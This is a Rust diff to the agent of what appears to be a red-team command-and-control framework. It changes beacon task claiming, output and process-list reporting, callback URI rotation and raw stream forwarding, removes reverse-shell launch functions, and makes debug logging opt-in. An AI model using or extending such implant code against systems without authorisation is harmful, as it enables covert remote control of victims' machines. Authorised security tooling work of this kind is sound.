@@ -17,10 +17,15 @@ use transport::Transport;
 
 use crate::portal::run_create_portal;
 use crate::shell::manager::{ShellManager, ShellManagerMessage};
-use crate::shell::{run_repl_reverse_shell, run_reverse_shell_pty};
 use crate::task::TaskRegistry;
 
 const MAX_BUF_OUTPUT_MESSAGES: usize = 65535;
+
+pub type PendingForward = (
+    String,
+    tokio::sync::mpsc::Receiver<Vec<u8>>,
+    tokio::sync::mpsc::Sender<Vec<u8>>,
+);
 
 #[derive(Clone)]
 pub struct ImixAgent {
@@ -34,12 +39,12 @@ pub struct ImixAgent {
     pub process_list_tx: std::sync::mpsc::SyncSender<c2::ReportProcessListRequest>,
     pub process_list_rx: Arc<Mutex<std::sync::mpsc::Receiver<c2::ReportProcessListRequest>>>,
     pub shell_manager_tx: tokio::sync::mpsc::Sender<ShellManagerMessage>,
+    pub pending_forwards: Arc<tokio::sync::Mutex<Vec<PendingForward>>>,
 }
 
 impl ImixAgent {
     pub fn new(
         config: Config,
-        transport: Box<dyn Transport + Send + Sync>,
         runtime_handle: tokio::runtime::Handle,
         task_registry: Arc<TaskRegistry>,
         shell_manager_tx: tokio::sync::mpsc::Sender<ShellManagerMessage>,
@@ -49,7 +54,7 @@ impl ImixAgent {
 
         Self {
             config: Arc::new(RwLock::new(config)),
-            transport: Arc::new(RwLock::new(transport)),
+            transport: Arc::new(RwLock::new(transport::init_transport())),
             runtime_handle,
             task_registry,
             subtasks: Arc::new(Mutex::new(BTreeMap::new())),
@@ -58,6 +63,7 @@ impl ImixAgent {
             process_list_tx,
             process_list_rx: Arc::new(Mutex::new(process_list_rx)),
             shell_manager_tx,
+            pending_forwards: Arc::new(tokio::sync::Mutex::new(Vec::new())),
         }
     }
 
@@ -147,7 +153,7 @@ impl ImixAgent {
             }
         }
 
-        #[cfg(debug_assertions)]
+        #[cfg(feature = "print_debug")]
         log::info!(
             "Flushing {} task outputs and {} process list reports",
             outputs.len(),
@@ -217,9 +223,14 @@ impl ImixAgent {
             }
         }
 
-        let mut transport = self.transport.write().await;
+        let mut transport_guard = self.transport.write().await;
+        let transport = &mut *transport_guard;
+        if !transport.is_active() {
+            return;
+        }
+
         for (_, (ctx, output)) in merged_task_outputs {
-            #[cfg(debug_assertions)]
+            #[cfg(feature = "print_debug")]
             log::info!("Task Output: {output:#?}");
 
             let req = ReportOutputRequest {
@@ -232,13 +243,13 @@ impl ImixAgent {
             };
 
             if let Err(_e) = transport.report_output(req).await {
-                #[cfg(debug_assertions)]
+                #[cfg(feature = "print_debug")]
                 log::error!("Failed to report task output: {_e}");
             }
         }
 
         for (_, (ctx, output)) in merged_shell_outputs {
-            #[cfg(debug_assertions)]
+            #[cfg(feature = "print_debug")]
             log::info!("Shell Task Output: {output:#?}");
 
             let req = ReportOutputRequest {
@@ -251,24 +262,23 @@ impl ImixAgent {
             };
 
             if let Err(_e) = transport.report_output(req).await {
-                #[cfg(debug_assertions)]
+                #[cfg(feature = "print_debug")]
                 log::error!("Failed to report shell task output: {_e}");
             }
         }
 
         // Only send the latest process list report (it replaces previous ones)
-        if let Some(req) = process_list_reqs.into_iter().last() {
-            if let Err(_e) = transport.report_process_list(req).await {
-                #[cfg(debug_assertions)]
-                log::error!("Failed to report process list: {_e}");
-            }
+        if let Some(req) = process_list_reqs.into_iter().last()
+            && let Err(_e) = transport.report_process_list(req).await
+        {
+            #[cfg(feature = "print_debug")]
+            log::error!("Failed to report process list: {_e}");
         }
     }
 
     // Helper to get config URIs for creating new transport
     pub async fn get_transport_config(&self) -> Config {
-        let config = self.config.read().await.clone();
-        config
+        self.config.read().await.clone()
     }
 
     pub async fn rotate_callback_uri(&self) {
@@ -295,13 +305,12 @@ impl ImixAgent {
                 return Ok(guard.clone_box());
             }
         }
-
         // 2. Create new transport from config
         let config = self.get_transport_config().await;
         let t =
             transport::create_transport(config).context("Failed to create on-demand transport")?;
 
-        #[cfg(debug_assertions)]
+        #[cfg(feature = "print_debug")]
         log::debug!("Created on-demand transport for background task");
 
         Ok(t)
@@ -309,7 +318,8 @@ impl ImixAgent {
 
     // Helper to claim tasks and return them, so main can spawn
     pub async fn claim_tasks(&self) -> Result<c2::ClaimTasksResponse> {
-        let mut transport = self.transport.write().await;
+        let mut transport_guard = self.transport.write().await;
+        let transport = &mut *transport_guard;
         let beacon_info = self.config.read().await.info.clone();
         let req = ClaimTasksRequest {
             beacon: beacon_info,
@@ -322,6 +332,31 @@ impl ImixAgent {
     }
 
     pub async fn process_job_request(&self) -> Result<()> {
+        // Dispatch any pending forward_raw requests before checking in.
+        // Each forward is spawned so the beacon cycle is not blocked by long-running
+        // streaming calls (e.g. ReportFile).
+        let pending: Vec<_> = {
+            let mut forwards = self.pending_forwards.lock().await;
+            forwards.drain(..).collect()
+        };
+        for (path, rx, tx) in pending {
+            let agent = self.clone();
+            self.runtime_handle.spawn(async move {
+                if let Ok(mut t) = agent.get_usable_transport().await {
+                    if let Err(_e) = t.forward_raw(path.clone(), rx, tx).await {
+                        #[cfg(feature = "print_debug")]
+                        log::error!("Deferred forward_raw to {} failed: {}", path, _e);
+                    }
+                } else {
+                    #[cfg(feature = "print_debug")]
+                    log::error!(
+                        "Failed to get transport for deferred forward_raw to {}",
+                        path
+                    );
+                }
+            });
+        }
+
         let resp = self.claim_tasks().await?;
 
         let mut has_work = false;
@@ -331,7 +366,7 @@ impl ImixAgent {
             let registry = self.task_registry.clone();
             let agent = Arc::new(self.clone());
             for task in resp.tasks {
-                #[cfg(debug_assertions)]
+                #[cfg(feature = "print_debug")]
                 log::info!("Claimed task {}: JWT={}", task.id, task.jwt);
 
                 registry.spawn(task, agent.clone());
@@ -391,12 +426,12 @@ impl ImixAgent {
             match agent.get_usable_transport().await {
                 Ok(transport) => {
                     if let Err(_e) = action(transport).await {
-                        #[cfg(debug_assertions)]
+                        #[cfg(feature = "print_debug")]
                         log::error!("Subtask {} error: {_e:#}", task_id);
                     }
                 }
                 Err(_e) => {
-                    #[cfg(debug_assertions)]
+                    #[cfg(feature = "print_debug")]
                     log::error!("Subtask {} failed to get transport: {_e:#}", task_id);
                 }
             }
@@ -411,6 +446,7 @@ impl ImixAgent {
 }
 
 // Implement the Eldritch Agent Trait
+#[async_trait::async_trait]
 impl Agent for ImixAgent {
     fn fetch_asset(&self, req: c2::FetchAssetRequest) -> Result<Vec<u8>, String> {
         // Transport uses std::sync::mpsc::Sender for fetch_asset
@@ -462,16 +498,6 @@ impl Agent for ImixAgent {
         Ok(c2::ReportOutputResponse {})
     }
 
-    fn start_reverse_shell(&self, context: Context, cmd: Option<String>) -> Result<(), String> {
-        let id = match &context {
-            Context::Task(tc) => tc.task_id,
-            Context::ShellTask(stc) => stc.shell_task_id,
-        };
-        self.spawn_subtask(id, move |transport| async move {
-            run_reverse_shell_pty(context, cmd, transport).await
-        })
-    }
-
     fn create_portal(&self, context: Context) -> Result<(), String> {
         let shell_manager_tx = self.shell_manager_tx.clone();
         let id = match &context {
@@ -483,19 +509,19 @@ impl Agent for ImixAgent {
         })
     }
 
-    fn start_repl_reverse_shell(&self, context: Context) -> Result<(), String> {
-        let agent = self.clone();
-        let id = match &context {
-            Context::Task(tc) => tc.task_id,
-            Context::ShellTask(stc) => stc.shell_task_id,
-        };
-        self.spawn_subtask(id, move |transport| async move {
-            run_repl_reverse_shell(context, transport, agent).await
-        })
-    }
-
     fn claim_tasks(&self, req: c2::ClaimTasksRequest) -> Result<c2::ClaimTasksResponse, String> {
         self.with_transport(|mut t| async move { t.claim_tasks(req).await })
+    }
+
+    async fn forward_raw(
+        &self,
+        path: String,
+        rx: tokio::sync::mpsc::Receiver<Vec<u8>>,
+        tx: tokio::sync::mpsc::Sender<Vec<u8>>,
+    ) -> Result<(), String> {
+        let mut forwards = self.pending_forwards.lock().await;
+        forwards.push((path, rx, tx));
+        Ok(())
     }
 
     fn get_config(&self) -> Result<BTreeMap<String, String>, String> {
@@ -621,6 +647,18 @@ impl Agent for ImixAgent {
         })
     }
 
+    fn reset_transport(&self) -> Result<(), String> {
+        self.block_on(async {
+            let mut cfg = self.config.write().await;
+            if let Some(info) = cfg.info.as_mut()
+                && let Some(available_transports) = info.available_transports.as_mut()
+            {
+                available_transports.active_index = 0;
+            }
+            Ok(())
+        })
+    }
+
     fn list_transports(&self) -> Result<Vec<String>, String> {
         self.block_on(async { Ok(self.transport.read().await.list_available()) })
     }
@@ -650,40 +688,28 @@ impl Agent for ImixAgent {
 
     fn set_callback_uri(&self, uri: String) -> Result<(), String> {
         self.block_on(async {
+            // Parse the new URI to handle DSN format with query parameters
+            let parsed_transport = pb::config::parse_dsn(&uri)
+                .map_err(|e| format!("Failed to parse callback URI: {}", e))?;
+
             let mut cfg = self.config.write().await;
             if let Some(info) = cfg.info.as_mut()
                 && let Some(available_transports) = info.available_transports.as_mut()
             {
-                // Check if URI already exists
-                if let Some(pos) = available_transports
-                    .transports
-                    .iter()
-                    .position(|t| t.uri == uri)
-                {
+                // Note: We compare against parsed_transport.uri because parse_dsn strips the query string
+                if let Some(pos) = available_transports.transports.iter().position(|t| {
+                    t.uri == parsed_transport.uri && t.r#type == parsed_transport.r#type
+                }) {
                     // Set active_index to existing transport
                     available_transports.active_index = pos as u32;
-                } else {
-                    // Get current transport as template
-                    let active_idx = available_transports.active_index as usize;
-                    let template = available_transports
-                        .transports
-                        .get(active_idx)
-                        .or_else(|| available_transports.transports.first())
-                        .cloned();
 
-                    if let Some(tmpl) = template {
-                        // Create new transport with the new URI
-                        let new_transport = pb::c2::Transport {
-                            uri,
-                            interval: tmpl.interval,
-                            r#type: tmpl.r#type,
-                            extra: tmpl.extra,
-                            jitter: tmpl.jitter,
-                        };
-                        available_transports.transports.push(new_transport);
-                        available_transports.active_index =
-                            (available_transports.transports.len() - 1) as u32;
-                    }
+                    // We also want to update the settings if they were provided in the DSN
+                    // Let's replace the existing transport with the newly parsed one
+                    available_transports.transports[pos] = parsed_transport;
+                } else {
+                    available_transports.transports.push(parsed_transport);
+                    available_transports.active_index =
+                        (available_transports.transports.len() - 1) as u32;
                 }
             }
             Ok(())
@@ -810,7 +836,7 @@ impl Agent for ImixAgent {
             .map_err(|_| "Poisoned lock".to_string())?;
         if let Some(handle) = map.remove(&task_id) {
             handle.abort();
-            #[cfg(debug_assertions)]
+            #[cfg(feature = "print_debug")]
             log::info!("Aborted subtask {task_id}");
         }
         Ok(())
